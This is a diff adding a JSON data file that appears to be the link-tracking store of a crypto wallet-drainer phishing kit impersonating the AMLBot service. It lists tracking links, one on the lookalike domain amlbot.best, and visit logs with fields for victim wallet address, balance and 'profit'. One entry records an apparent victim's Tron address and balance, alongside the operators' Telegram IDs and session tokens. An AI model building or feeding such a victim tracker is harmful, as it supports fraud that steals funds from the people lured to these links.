@@ -1,0 +1,96 @@
+[
+  {
+    "code": "VeZnhlTm",
+    "url": "http://localhost:8080/VeZnhlTm",
+    "created": "2026-03-23 22:42:44",
+    "clicks": 8,
+    "success": 0,
+    "template": "AMLBot",
+    "visits": [
+      {
+        "date": "2026-03-23 22:42:53",
+        "type": "click",
+        "country": "N/A",
+        "source": "aml"
+      },
+      {
+        "date": "2026-03-23 22:42:53",
+        "type": "click",
+        "address": "",
+        "balance": 0,
+        "profit": 0,
+        "country": "N/A",
+        "source": "aml"
+      },
+      {
+        "date": "2026-03-23 22:46:32",
+        "type": "click",
+        "country": "N/A",
+        "source": "aml"
+      },
+      {
+        "date": "2026-03-23 22:46:32",
+        "type": "click",
+        "address": "",
+        "balance": 0,
+        "profit": 0,
+        "country": "N/A",
+        "source": "aml"
+      },
+      {
+        "date": "2026-03-23 23:07:40",
+        "type": "click",
+        "country": "N/A",
+        "source": "aml"
+      },
+      {
+        "date": "2026-03-23 23:07:40",
+        "type": "click",
+        "address": "",
+        "balance": 0,
+        "profit": 0,
+        "country": "N/A",
+        "source": "aml"
+      },
+      {
+        "date": "2026-03-25 20:05:07",
+        "type": "click",
+        "country": "N/A",
+        "source": "aml"
+      },
+      {
+        "date": "2026-03-25 20:05:07",
+        "type": "click",
+        "address": "",
+        "balance": 0,
+        "profit": 0,
+        "country": "N/A",
+        "source": "aml"
+      },
+      {
+        "date": "2026-03-25 20:06:58",
+        "type": "connect",
+        "address": "TGveYQ4FC13K5MxGJhZDzoW2VgHnwJUJ57",
+        "balance": 0.8129514935359999,
+        "profit": 0,
+        "country": "CZ",
+        "source": "aml"
+      }
+    ],
+    "owner_tg_id": 1916338307,
+    "owner_username": "sloqz",
+    "owner_session": "6e80f3db4ce3e2a7160749003bc77930"
+  },
+  {
+    "code": "Dgha4NAQ",
+    "url": "https://amlbot.best/Dgha4NAQ",
+    "created": "2026-03-25 20:04:28",
+    "clicks": 0,
+    "success": 0,
+    "template": "AMLBot",
+    "visits": [],
+    "owner_tg_id": 8744584452,
+    "owner_username": "BlancSupport",
+    "owner_session": "b40b84a2ef10d7809fbc7e2f343fae7d"
+  }
+]
